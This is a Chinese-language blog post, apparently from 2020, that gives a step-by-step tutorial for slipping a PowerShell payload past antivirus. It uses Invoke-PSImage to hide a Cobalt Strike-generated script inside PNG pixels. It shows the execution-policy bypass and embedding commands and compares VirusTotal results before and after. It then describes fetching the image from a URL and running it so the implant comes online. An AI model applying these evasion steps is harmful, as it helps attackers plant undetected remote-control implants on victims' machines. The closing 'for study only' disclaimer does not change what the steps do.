---
layout:     post
title:      Invoke-PSImage实现ps脚本免杀
subtitle:   Ps脚本免杀
date:       2020-05-17
author:     Cooltige
header-img: img/post-bg-ps.jpg
catalog: true
tags:
    - 免杀
---
# Invoke-PSImage
Invoke-PSImage可以将一个PowerShell脚本中的字节嵌入到PNG图像文件的像素之中，并生成一行执行命令来帮助我们从文件或Web（传递-Web标记）执行它们。

它会利用图片中每个像素点最后4位有效位的2个颜色值来存储Payload数据，虽然图片质量会受到影响，但是一般来说是看不出来有多大区别的。图片需要存储为PNG格式，由于Payload数据存储在颜色值中，因此这种格式可以进行无损压缩并且不会影响到Payload的执行。它可以接受目前绝大多数的图片类型作为输入，但输出必须为PNG格式，因为输出的图片数据需要是无损的。

图片的每一个像素都需要存储脚本的一个字节，所以你需要根据脚本中的字节数据大小来选择图片（尽可能多的像素点）。

项目地址:`https://github.com/peewpw/Invoke-PSImage`

# 实验前准备
### cs生成powershell脚本

![](http://cooltige.com/wp-content/uploads/2020/02/dc70ceed77fcabc703cdd5d3f02def6c.png)

payload.ps1
### 准备图片
![](http://cooltige.com/wp-content/uploads/2020/02/19d3f2e1cd905f9b8b037759249ff2ae.png)

1.jpg

### Invoke-PSImage文件
Invoke-PSImage.ps1
# 开始实验
首先将生成的payload.ps1进行在线查杀
virustotal:`www.virustotal.com`
![](http://cooltige.com/wp-content/uploads/2020/02/9e700a3d729cd2970c156ecf4acfee77.png)

然后将 payload.ps1 1.jpg Invoke-PSImage.ps1 放在一个文件夹(这里我放在桌面)
```
C:\Users\Administrator\Desktop>powershell -exec bypass

PS C:\Users\Administrator\Desktop> Import-Module .\Invoke-PSImage.ps1

PS C:\Users\Administrator\Desktop>Invoke-PSImage -Script .\payload.ps1 -Image .\1.jpg -Out .\shell.png -Web
```

![](http://cooltige.com/wp-content/uploads/2020/02/d0d0e0fe549dfd0365fdeaee67498b0c.png)

生成一个shell.png的免杀图片文件

将生成的文件拿去查杀

![](http://cooltige.com/wp-content/uploads/2020/02/f1294cb6d52dfa01aa17020ae9a446d7.png)

将生成的命令中的`http://example.com/shell.png`替换为你免杀图片的url，带入powershell中执行

![](http://cooltige.com/wp-content/uploads/2020/02/185f3178d181147b1671c92080b4620d.png)

![](http://cooltige.com/wp-content/uploads/2020/02/77af8c88af3f28d846b0dd431174eace.png)

完成上线

**<font color=red>本站提供的所有内容仅供学习、分享与交流，禁止用于非法途径，通过使用本站内容随之而来的风险与本站无关。</font>**